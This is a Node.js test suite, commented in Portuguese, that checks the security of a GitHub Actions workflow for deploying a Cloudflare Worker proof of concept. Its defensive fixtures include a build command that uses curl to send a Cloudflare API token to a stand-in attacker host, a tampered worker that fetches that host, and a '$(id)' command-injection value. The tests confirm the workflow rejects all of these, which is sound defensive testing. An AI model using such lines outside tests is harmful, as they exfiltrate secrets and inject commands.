// RAC Inbox · POC autenticada iCloud — DESENHO B: o workflow privilegiado vive só na main e trata o commit da POC como DADO.
// Sem rede e sem credencial. Parte dos testes lê o texto do workflow; a outra EXECUTA de verdade os passos que não precisam de rede
// (guarda da entrada, montagem do pacote, reconstituição com conferência de hash) para provar que entradas adulteradas são recusadas.
// A fronteira contra quem controla uma branch é a configuração do GitHub (Environments só da main) somada a este arquivo existir só na main.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";

const raiz = new URL("../", import.meta.url);
const ler = (a) => fs.readFileSync(new URL(a, raiz), "utf8");
const existe = (a) => fs.existsSync(new URL(a, raiz));
const semComentarios = (t) => t.replace(/^\s*#.*$/gm, "").replace(/\s+#\s.*$/gm, "");
const WFTXT = ler(".github/workflows/icloud-auth-probe.yml");
const WF = semComentarios(WFTXT);
const tem = (c) => spawnSync(c, ["--version"]).status === 0;
const semFerramentas = tem("bash") && tem("jq") && tem("git") && tem("sha256sum") && tem("base64") ? false : "bash, jq, git, sha256sum ou base64 não encontrados";

function jobs() {
  const marcas = [...WF.matchAll(/^  (verificar|provisionar|executar):\s*$/gm)].map((m) => ({ nome: m[1], i: m.index }));
  const out = {};
  marcas.forEach((x, k) => { out[x.nome] = WF.slice(x.i, k + 1 < marcas.length ? marcas[k + 1].i : WF.length); });
  return out;
}
const passosDe = (job) => { const m = [...job.matchAll(/^      - /gm)].map((x) => x.index); return m.map((i, k) => job.slice(i, k + 1 < m.length ? m[k + 1] : job.length)); };
const nomeDe = (p) => (/- name: (.+)/.exec(p) || [, ""])[1].trim();
const J = jobs();
const PV = passosDe(J.verificar), PP = passosDe(J.provisionar), PE = passosDe(J.executar);
const comSecret = (p) => /\$\{\{\s*secrets\./.test(p);
function script(passo) { // o bloco "run: |" do passo, sem a indentação do YAML
  const m = /\n        run: \|\n((?:          .*\n|\s*\n)+)/.exec(passo.endsWith("\n") ? passo : passo + "\n");
  assert.ok(m, "passo sem bloco run: " + nomeDe(passo));
  return m[1].replace(/^ {10}/gm, "");
}
const achar = (lista, prefixo) => lista.find((p) => nomeDe(p).startsWith(prefixo));
const SHA_CHECKOUT = "11d5960a326750d5838078e36cf38b85af677262";
const SHA_NODE = "49933ea5288caeca8642d1e84afbd3f7d6820020";

// ---------- estrutura e fronteiras de confiança ----------

test("só dispara na mão, com uma única entrada (o commit da POC) e sem permissões por padrão", () => {
  assert.match(WF, /^on:\s*\n\s+workflow_dispatch:\s*\n\s+inputs:\s*\n\s+commit:\s*\n(?:\s+(?:description|required|type): .+\n)+/m);
  assert.deepEqual([...WF.matchAll(/^      (\w+):\s*$/gm)].map((m) => m[1]).filter((n) => ["commit"].includes(n)), ["commit"]);
  assert.match(WF, /required: true/);
  assert.match(WF, /type: string/);
  for (const x of [/\bpush:/, /\bpull_request/, /\bschedule:/, /\bcron:/, /\bworkflow_run:/, /\bworkflow_call:/, /\brepository_dispatch:/])
    assert.ok(!x.test(WF), "gatilho automático não permitido: " + x);
  assert.match(WF, /^permissions: \{\}\s*$/m);
});

test("o workflow privilegiado só roda a partir da main: os três jobs recusam qualquer outra ref e nenhum cita a branch da POC", () => {
  for (const [n, j] of Object.entries(J)) assert.match(j, /\[ "\$GITHUB_REF" != "refs\/heads\/main" \]/, "guarda de ref em " + n);
  assert.equal([...WF.matchAll(/\[ "\$GITHUB_REF" != "refs\/heads\/main" \]/g)].length, 3);
  assert.ok(!/poc\/icloud-cloudflare-connectivity|refs\/heads\/poc/.test(WF), "o workflow não depende do nome da branch da POC");
  assert.ok(!/branches?:\s*\[/.test(WF));
});

test("a entrada commit só passa por env e por ref do checkout, e é validada (40 hexadecimais) antes de qualquer uso; nunca colada em script", () => {
  for (const [n, j] of Object.entries(J)) {
    for (const p of passosDe(j).filter((x) => /\n        run: \|/.test(x))) assert.ok(!/\$\{\{/.test(script(p)), n + ": expressão do GitHub dentro de script em " + nomeDe(p));
  }
  const usos = [...WF.matchAll(/inputs\.commit/g)].length;
  assert.equal(usos, 4, "três env COMMIT (guarda, montagem e empacotamento) e uma ref do checkout");
  assert.match(WF, /ref: \$\{\{ inputs\.commit \}\}/);
  assert.equal([...WF.matchAll(/^\s+COMMIT: \$\{\{ inputs\.commit \}\}\s*$/gm)].length, 3);
  assert.ok(nomeDe(PV[0]).startsWith("Só na main e com um commit válido"), "a validação é o primeiro passo");
  assert.ok(!/inputs\./.test(J.provisionar) && !/inputs\./.test(J.executar), "só o job verificar usa a entrada");
});

test("o commit da POC é só dado: baixado à parte, em pasta própria, e nada dela é executado", () => {
  const checkouts = [...WF.matchAll(/uses: actions\/checkout@([0-9a-f]{40})\n\s+with:\n((?:\s{10}.+\n)+)/g)].map((m) => m[2]);
  assert.equal(checkouts.length, 3, "main no verificar, POC como dado no verificar, main no provisionar");
  for (const c of checkouts) assert.match(c, /persist-credentials: false/);
  const poc = checkouts.filter((c) => /ref: /.test(c));
  assert.equal(poc.length, 1);
  assert.match(poc[0], /path: poc/);
  assert.match(poc[0], /sparse-checkout: \|\n\s+\/experimentos\/icloud-auth-probe\/\n\s+sparse-checkout-cone-mode: false/);
  for (const c of checkouts.filter((c) => !/ref: /.test(c))) assert.match(c, /sparse-checkout: \|\n\s+\/experimentos\/icloud-auth-probe-ferramenta\/\n\s+sparse-checkout-cone-mode: false/, "da main só os dados da ferramenta");
  // nada da pasta poc é executado
  const scripts = PV.map((p) => (/\n        run: \|/.test(p) ? script(p) : "")).join("\n");
  for (const linha of scripts.split("\n").filter((l) => /\bpoc\b/.test(l) && !/^\s*#/.test(l))) {
    assert.ok(!/(?:^|[\s;&|(])(?:node|bash|sh|npm|npx|npm ci|python3?|source|eval|exec|make|\.)\s+[^\n]*\bpoc\//.test(linha), "execução de algo da pasta poc: " + linha.trim());
    assert.ok(!/\$\(\s*(?:\.|source)\s|\.\/poc|bash poc|node poc/.test(linha), linha.trim());
  }
  for (const j of [J.provisionar, J.executar]) assert.ok(!/(?:^|[\s"'=])poc\//.test(j) && !/path: poc/.test(j) , "o job com secrets e o job OIDC nem citam a pasta da POC");
  assert.ok(!/node --test|\btests\//.test(WF), "nenhum teste do código da POC roda neste workflow (o CI da PR da POC faz isso)");
  assert.ok(!/\bnpm (?:i|install|run|exec|test)\b|\bnpx\b/.test(WF));
});

test("secrets só existem em dois passos do job provisionar, que não executa nada vindo da branch", () => {
  assert.ok(!/\bsecrets\./.test(J.verificar) && !/\bsecrets\./.test(J.executar), "verificar e executar não têm secrets");
  assert.ok(!/secrets\./.test(J.provisionar.split(/^    steps:/m)[0]), "nenhum secret no cabeçalho do job");
  assert.ok(!/secrets\./.test(WF.split(/^jobs:/m)[0]), "nenhum secret no nível do workflow");
  const com = PP.filter(comSecret);
  assert.deepEqual(com.map(nomeDe), ["Conferir o token Cloudflare (sem mostrar dados da conta)", "Publicar o pacote aprovado (Workers Free)"]);
  for (const p of com) {
    const env = /\n        env:\n((?:          .+\n)+)/.exec(p);
    assert.ok(env);
    assert.deepEqual([...env[1].matchAll(/^          (\w+): /gm)].map((m) => m[1]).sort(), ["CLOUDFLARE_ACCOUNT_ID", "CLOUDFLARE_API_TOKEN"]);
  }
  assert.ok(comSecret(PP.at(-1)) && comSecret(PP.at(-2)) && nomeDe(PP.at(-1)).startsWith("Publicar"), "os dois últimos passos, sendo a publicação o último");
  const [token, publicar] = com;
  assert.ok(/\bcurl\b/.test(token) && !/\bnode\b|\bnpm\b|wrangler/.test(token), "a conferência do token só usa curl e jq");
  assert.match(token, /-K <\(printf 'header = "Authorization: Bearer %s"\\n' "\$CLOUDFLARE_API_TOKEN"\)/);
  assert.ok(!/Authorization: Bearer \$CLOUDFLARE_API_TOKEN/.test(token));
  assert.match(publicar, /cd "\$RUNNER_TEMP\/publicar"/);
  assert.match(publicar, /node "\$GITHUB_WORKSPACE\/experimentos\/icloud-auth-probe-ferramenta\/node_modules\/wrangler\/bin\/wrangler\.js" deploy --config "\$RUNNER_TEMP\/publicar\/wrangler\.publicar\.jsonc"/);
  assert.ok(!/--dry-run/.test(publicar) && !/secret put|\bnpx\b/.test(publicar));
  assert.ok(!/(?:^|\s)-x\b|set -x/.test(WF), "sem set -x");
  assert.match(J.provisionar, /NPM_CONFIG_IGNORE_SCRIPTS: "true"/);
  for (const linha of J.provisionar.split("\n").filter((l) => /\bnode\b/.test(l) && !/node-version|^\s*-?\s*uses:/.test(l))) assert.match(linha, /wrangler\/bin\/wrangler\.js/, "o único uso de node é o Wrangler do lockfile");
});

test("job executar: Environment icloud-auth-poc, id-token só aqui, sem actions, checkout, Wrangler, secrets nem credencial Cloudflare", () => {
  assert.match(J.executar, /^    environment: icloud-auth-poc\s*$/m);
  assert.match(J.executar, /^    needs: provisionar\s*$/m);
  assert.match(J.executar, /^    permissions:\n      id-token: write\n    env:/m);
  assert.equal([...WF.matchAll(/id-token:\s*write/g)].length, 1);
  assert.ok(!/CLOUDFLARE_(?:API_TOKEN|ACCOUNT_ID)|wrangler|\buses:|checkout|contents:|\bnpm\b|\bnpx\b/i.test(J.executar));
  assert.ok(!/\bsecrets\b/.test(J.executar) && !/\$\{\{/.test(J.executar.replace(/^\s*runs-on:.*$/m, "")));
  assert.ok(!/ICLOUD|senha|usuario|password|PASSWORD/.test(WF), "nenhuma credencial Apple no workflow");
  assert.match(J.executar, /--data '\{"operacao":"validar_oidc"\}'/);
  assert.match(J.executar, /^      WORKER_URL: https:\/\/rac-icloud-auth-poc\.[a-z0-9-]+\.workers\.dev\s*$/m);
  assert.ok(!/echo[^\n]*\$\{?(JWT\b|ACTIONS_ID_TOKEN)/.test(J.executar.replace(/echo "::add-mask::\$JWT"/, "")));
  assert.ok(J.executar.indexOf("::add-mask::$JWT") < J.executar.indexOf('"$WORKER_URL/auth-probe"'));
  assert.match(J.executar, /unset JWT/);
});

test("nada sensível passa entre os jobs: só commit, hash e pacote públicos vão de verificar para provisionar; executar não lê nada", () => {
  for (const x of [/upload-artifact/, /download-artifact/, /\bcache@/, /GITHUB_ENV/, /GITHUB_PATH/, /\bartifact/i, /steps\.\w+\.outputs\.(?!commit|sha256|pacote)/])
    assert.ok(!x.test(WF), "mecanismo proibido entre jobs: " + x);
  const saidas = [...J.verificar.matchAll(/^      (\w+): \$\{\{ steps\.empacotar\.outputs\.(\w+) \}\}\s*$/gm)].map((m) => m[1]);
  assert.deepEqual(saidas.sort(), ["commit", "pacote", "sha256"]);
  assert.ok(!/\boutputs:/.test(J.provisionar) && !/\boutputs:/.test(J.executar) && !/GITHUB_OUTPUT/.test(J.provisionar) && !/GITHUB_OUTPUT/.test(J.executar));
  assert.deepEqual([...J.provisionar.matchAll(/needs\.(\w+)\.outputs\.(\w+)/g)].map((m) => m[1] + "." + m[2]).sort(), ["verificar.commit", "verificar.pacote", "verificar.sha256"]);
  assert.ok(!/needs\./.test(J.executar.replace(/^    needs: provisionar\s*$/m, "")));
});

test("actions oficiais fixadas por SHA (conferidos nos repositórios oficiais) e Wrangler só pelo lockfile da main, sem scripts", () => {
  const usos = [...WF.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1]);
  assert.equal(usos.length, 5);
  for (const u of usos) assert.match(u, /^actions\/(checkout|setup-node)@[0-9a-f]{40}$/, u);
  assert.equal(usos.filter((u) => u === "actions/checkout@" + SHA_CHECKOUT).length, 3);
  assert.equal(usos.filter((u) => u === "actions/setup-node@" + SHA_NODE).length, 2);
  assert.equal([...WFTXT.matchAll(/@[0-9a-f]{40} # v4\.4\.0/g)].length, 5);
  assert.ok(!/\bwrangler@/.test(WF) && !/\bnpx\b/.test(WF));
  assert.equal([...WF.matchAll(/npm ci --prefix "\$FERR" --ignore-scripts --no-audit --no-fund/g)].length, 2);
  const dir = "experimentos/icloud-auth-probe-ferramenta/";
  const pkg = JSON.parse(ler(dir + "package.json")), lock = JSON.parse(ler(dir + "package-lock.json"));
  assert.deepEqual(pkg.dependencies, { wrangler: "4.161.0" });
  assert.ok(!pkg.scripts && pkg.private === true);
  const integr = lock.packages["node_modules/wrangler"].integrity;
  assert.match(integr, /^sha512-[A-Za-z0-9+/=]{80,}$/);
  for (const j of ["verificar", "provisionar"]) assert.ok(J[j].includes('"' + integr + '"'), "integridade conferida em " + j);
  const sem = Object.entries(lock.packages).filter(([k, v]) => k !== "" && (!v.integrity || !/^https:\/\/registry\.npmjs\.org\//.test(v.resolved || ""))).map(([k]) => k);
  assert.deepEqual(sem, []);
  for (const alvo of ["", dir]) assert.ok(!existe(alvo + ".npmrc"));
  assert.deepEqual(fs.readdirSync(new URL(dir, raiz)).sort(), ["README.md", "package-lock.json", "package.json"]);
});

test("integridade do pacote: lista fixa, config única escrita no workflow, dry-run, inspeção, sha256 e publicação do mesmo arquivo sem bundle", () => {
  const montar = achar(PV, "Montar o pacote");
  assert.match(montar, /ESPERADO=\$'\.\/README\.md\\n\.\/src\/index\.mjs\\n\.\/src\/jwks\.mjs\\n\.\/src\/jwt\.mjs\\n\.\/src\/politica\.mjs\\n\.\/wrangler\.jsonc'/);
  assert.match(montar, /find "\$BASE" -type l/);
  assert.match(montar, /for ARQ in politica jwt jwks index; do cp "\$BASE\/src\/\$ARQ\.mjs"/);
  const heredoc = (j) => JSON.parse(new RegExp("<<'JSON'\\n([\\s\\S]*?)\\n\\s*JSON\\n").exec(j)[1].replace(/^\s{10}/gm, ""));
  const cfgV = heredoc(J.verificar), cfgP = heredoc(J.provisionar);
  assert.deepEqual(Object.keys(cfgV).sort(), ["compatibility_date", "main", "name", "observability", "workers_dev"], "nenhuma chave executável ou de armazenamento");
  assert.deepEqual(cfgP, { name: cfgV.name, compatibility_date: cfgV.compatibility_date, workers_dev: cfgV.workers_dev, observability: cfgV.observability });
  assert.match(J.provisionar, /jq --arg main "\$DEST\/index\.js" '\. \+ \{main: \$main, no_bundle: true\}'/);
  const emp = achar(PV, "Empacotar");
  assert.match(emp, /deploy --dry-run --outdir/);
  for (const padrao of [String.raw`process\.env`, String.raw`eval\(`, "new Function", "cloudflare:", String.raw`imap\.mail\.me\.com`, String.raw`smtp\.mail\.me\.com`, String.raw`import\(`, String.raw`require\(`, String.raw`console\.`]) assert.ok(emp.includes("'" + padrao + "'"), "inspeção: " + padrao);
  assert.match(emp, /"\$HOSTS" != "https:\/\/token\.actions\.githubusercontent\.com"/);
  assert.match(emp, /sha256sum "\$BUNDLE"/);
  assert.match(emp, /Antes de aprovar/);
  const rec = achar(PP, "Reconstituir");
  assert.match(rec, /sha256sum -c -/);
  assert.match(rec, /PACOTE_B64: \$\{\{ needs\.verificar\.outputs\.pacote \}\}/);
  assert.match(rec, /SHA256_ESPERADO: \$\{\{ needs\.verificar\.outputs\.sha256 \}\}/);
});

test("um único caminho de publicação privilegiada: nenhum outro workflow usa os Environments com secrets ou o Wrangler com secrets", () => {
  const dir = ".github/workflows/";
  const arquivos = fs.readdirSync(new URL(dir, raiz)).filter((f) => /\.ya?ml$/.test(f));
  assert.ok(!arquivos.includes("icloud-probe-deploy.yml"), "o workflow antigo (npx sem lockfile, configuração da ref) foi retirado");
  const privilegiados = arquivos.filter((f) => /environment:\s*(cloudflare-poc|icloud-auth-poc)|CLOUDFLARE_API_TOKEN/.test(ler(dir + f)));
  assert.deepEqual(privilegiados, ["icloud-auth-probe.yml"]);
});

// ---------- execução real dos passos que não precisam de rede ----------

const TMPS = [];
function tmp() { const d = fs.mkdtempSync(path.join(os.tmpdir(), "rac-wf-")); TMPS.push(d); return d; }
process.on("exit", () => { for (const d of TMPS) fs.rmSync(d, { recursive: true, force: true }); });
const CFG = { $schema: "node_modules/wrangler/config-schema.json", name: "rac-icloud-auth-poc", main: "src/index.mjs", compatibility_date: "2026-11-13", workers_dev: true, observability: { enabled: false } };
function fixture({ extra = {}, cfg = CFG } = {}) {
  const ws = tmp(), base = path.join(ws, "poc/experimentos/icloud-auth-probe");
  fs.mkdirSync(path.join(base, "src"), { recursive: true });
  fs.writeFileSync(path.join(base, "README.md"), "# poc\n");
  fs.writeFileSync(path.join(base, "wrangler.jsonc"), JSON.stringify(cfg, null, 2));
  for (const n of ["politica", "jwt", "jwks", "index"]) fs.writeFileSync(path.join(base, "src", n + ".mjs"), "export const " + n + " = 1;\n");
  for (const [rel, conteudo] of Object.entries(extra)) { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), conteudo); }
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" };
  const g = (...a) => spawnSync("git", ["-C", path.join(ws, "poc"), ...a], { env, encoding: "utf8" });
  g("init", "-q"); g("add", "-A"); g("-c", "commit.gpgsign=false", "commit", "-q", "-m", "x");
  return { ws, base, commit: g("rev-parse", "HEAD").stdout.trim() };
}
function rodar(passo, { cwd, env = {} }) {
  const tempDir = tmp();
  const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(passo)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH, HOME: tempDir, RUNNER_TEMP: tempDir, GITHUB_WORKSPACE: cwd, GITHUB_STEP_SUMMARY: path.join(tempDir, "resumo.md"), GITHUB_OUTPUT: path.join(tempDir, "saida.txt"), ...env } });
  return { ...r, tempDir };
}

test("EXECUÇÃO — guarda da entrada: só a main e só 40 hexadecimais minúsculos", { skip: semFerramentas }, () => {
  const passo = PV[0];
  const ok = "0123456789abcdef0123456789abcdef01234567";
  assert.equal(rodar(passo, { cwd: tmp(), env: { GITHUB_REF: "refs/heads/main", COMMIT: ok } }).status, 0);
  for (const [nome, env] of [["outra branch", { GITHUB_REF: "refs/heads/poc/icloud-cloudflare-connectivity", COMMIT: ok }], ["ref de PR", { GITHUB_REF: "refs/pull/17/merge", COMMIT: ok }],
    ["vazio", { GITHUB_REF: "refs/heads/main", COMMIT: "" }], ["39 caracteres", { GITHUB_REF: "refs/heads/main", COMMIT: ok.slice(1) }], ["41 caracteres", { GITHUB_REF: "refs/heads/main", COMMIT: ok + "0" }],
    ["maiúsculas", { GITHUB_REF: "refs/heads/main", COMMIT: ok.toUpperCase() }], ["injeção de comando", { GITHUB_REF: "refs/heads/main", COMMIT: ok.slice(0, 30) + "$(id)abcd" }],
    ["nome de branch", { GITHUB_REF: "refs/heads/main", COMMIT: "poc/icloud-cloudflare-connectivity" }]])
    assert.notEqual(rodar(passo, { cwd: tmp(), env }).status, 0, nome);
});

test("EXECUÇÃO — montagem do pacote: aceita só a lista fixa de arquivos regulares, com a config equivalente à do workflow", { skip: semFerramentas }, () => {
  const passo = achar(PV, "Montar o pacote");
  const bom = fixture();
  const r = rodar(passo, { cwd: bom.ws, env: { COMMIT: bom.commit } });
  assert.equal(r.status, 0, r.stderr);
  const pacote = path.join(r.tempDir, "pacote");
  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), ["index.mjs", "jwks.mjs", "jwt.mjs", "politica.mjs"]);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(pacote, "wrangler.jsonc"), "utf8")), { name: CFG.name, main: CFG.main, compatibility_date: CFG.compatibility_date, workers_dev: true, observability: { enabled: false } });
  assert.match(fs.readFileSync(path.join(r.tempDir, "fontes.sha256"), "utf8"), /src\/index\.mjs/);
  const recusar = (nome, f, env) => { const x = rodar(passo, { cwd: f.ws, env: { COMMIT: f.commit, ...env } }); assert.notEqual(x.status, 0, nome); return x; };
  recusar("arquivo .env escondido", fixture({ extra: { ".env": "CLOUDFLARE_API_BASE_URL=https://atacante.exemplo\n" } }));
  recusar(".dev.vars", fixture({ extra: { ".dev.vars": "X=1\n" } }));
  recusar("package.json extra", fixture({ extra: { "package.json": "{}" } }));
  recusar("wrangler.toml extra", fixture({ extra: { "wrangler.toml": "name='x'" } }));
  recusar("arquivo extra em src", fixture({ extra: { "src/extra.mjs": "export {};\n" } }));
  recusar("build.command na config", fixture({ cfg: { ...CFG, build: { command: "curl https://atacante.exemplo/$CLOUDFLARE_API_TOKEN" } } }));
  recusar("vars na config", fixture({ cfg: { ...CFG, vars: { X: "1" } } }));
  recusar("outra rota na config", fixture({ cfg: { ...CFG, routes: ["x.exemplo/*"] } }));
  const comLink = fixture();
  fs.rmSync(path.join(comLink.base, "src/index.mjs")); fs.symlinkSync("/etc/hostname", path.join(comLink.base, "src/index.mjs"));
  recusar("link simbólico no lugar de um arquivo", comLink);
  const errado = fixture();
  recusar("commit diferente do checkout", errado, { COMMIT: "f".repeat(40) });
  const semPasta = tmp();
  assert.notEqual(rodar(passo, { cwd: semPasta, env: { COMMIT: "a".repeat(40) } }).status, 0, "sem a pasta do Worker");
});

test("EXECUÇÃO — reconstituição: publica só o arquivo cujo sha256 confere; adulteração, hash errado ou vazio são recusados", { skip: semFerramentas }, () => {
  const passo = achar(PP, "Reconstituir");
  const conteudo = Buffer.from("export default { fetch() { return new Response('ok'); } };\n");
  const hash = (b) => spawnSync("sha256sum", [], { input: b, encoding: "utf8" }).stdout.split(" ")[0];
  const b64 = conteudo.toString("base64");
  const ok = rodar(passo, { cwd: tmp(), env: { PACOTE_B64: b64, SHA256_ESPERADO: hash(conteudo), COMMIT_APROVADO: "a".repeat(40) } });
  assert.equal(ok.status, 0, ok.stderr);
  const publicar = path.join(ok.tempDir, "publicar");
  assert.equal(fs.readFileSync(path.join(publicar, "index.js"), "utf8"), conteudo.toString());
  const cfg = JSON.parse(fs.readFileSync(path.join(publicar, "wrangler.publicar.jsonc"), "utf8"));
  assert.deepEqual(Object.keys(cfg).sort(), ["compatibility_date", "main", "name", "no_bundle", "observability", "workers_dev"]);
  assert.equal(cfg.no_bundle, true);
  assert.equal(cfg.main, path.join(publicar, "index.js"), "publica exatamente o arquivo conferido");
  const adulterado = Buffer.from("export default { fetch() { return fetch('https://atacante.exemplo'); } };\n");
  for (const [nome, env] of [["pacote adulterado com o hash do original", { PACOTE_B64: adulterado.toString("base64"), SHA256_ESPERADO: hash(conteudo) }],
    ["hash adulterado", { PACOTE_B64: b64, SHA256_ESPERADO: hash(adulterado) }], ["hash zerado", { PACOTE_B64: b64, SHA256_ESPERADO: "0".repeat(64) }],
    ["hash vazio", { PACOTE_B64: b64, SHA256_ESPERADO: "" }], ["pacote vazio", { PACOTE_B64: "", SHA256_ESPERADO: hash(conteudo) }],
    ["um byte a menos", { PACOTE_B64: conteudo.subarray(1).toString("base64"), SHA256_ESPERADO: hash(conteudo) }]]) {
    const x = rodar(passo, { cwd: tmp(), env: { COMMIT_APROVADO: "a".repeat(40), ...env } });
    assert.notEqual(x.status, 0, nome);
    assert.ok(!fs.existsSync(path.join(x.tempDir, "publicar", "wrangler.publicar.jsonc")), nome + ": nenhuma configuração de publicação é gerada para um pacote não conferido");
  }
});

// ---------- coerência com a política do Worker e com a documentação ----------

// Com o Worker de replay + P1 (que traz consumo.mjs e três operações) esta coerência com o workflow ANTERIOR deixa de valer; a coerência com o workflow novo
// é verificada pelo teste da versão nova deste arquivo, que chega a esta branch com o merge da PR do workflow (replay + P1) na main.
const temWorker = existe("experimentos/icloud-auth-probe/src/politica.mjs") && !existe("experimentos/icloud-auth-probe/src/consumo.mjs");
test("o Worker (quando presente) só aceita tokens da main, do workflow deste arquivo e do Environment icloud-auth-poc", { skip: !temWorker && "o código do Worker está na branch da POC e chega à main com a PR dela" }, async () => {
  const { POLITICA, workflowRefEsperado, audienciasPermitidas } = await import("../experimentos/icloud-auth-probe/src/politica.mjs");
  assert.deepEqual(POLITICA.refsPermitidos, ["refs/heads/main"]);
  assert.equal(workflowRefEsperado(POLITICA.refsPermitidos[0]), POLITICA.repository + "/.github/workflows/icloud-auth-probe.yml@refs/heads/main");
  assert.equal(POLITICA.arquivoWorkflow, ".github/workflows/icloud-auth-probe.yml");
  assert.deepEqual(POLITICA.eventosPermitidos, ["workflow_dispatch"]);
  assert.equal(POLITICA.environment, "icloud-auth-poc");
  assert.match(J.executar, new RegExp("^    environment: " + POLITICA.environment + "\\s*$", "m"));
  assert.deepEqual(audienciasPermitidas(), [/AUDIENCIA: (\S+)/.exec(J.executar)[1]]);
});

test("documentação: o guia registra o desenho B, os SHAs conferidos, a limitação de replay e o procedimento manual do workflow antigo", () => {
  const guia = ler("docs/icloud-poc-deploy.md");
  for (const sha of [SHA_CHECKOUT, SHA_NODE]) assert.ok(guia.includes(sha), "SHA ausente do guia: " + sha);
  for (const trecho of [/Desenho B/, /Disable workflow/i, /replay/i, /uso único/i, /Deployment branches/i, /icloud-probe-deploy\.yml/, /só a `main`|apenas a `main`|somente a `main`/i]) assert.match(guia, trecho);
  for (const t of [WFTXT, guia]) assert.ok(!/(?:cfut_|cfat_|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}|Bearer [A-Za-z0-9_-]{30,})/.test(t), "parece um token escrito no texto");
});
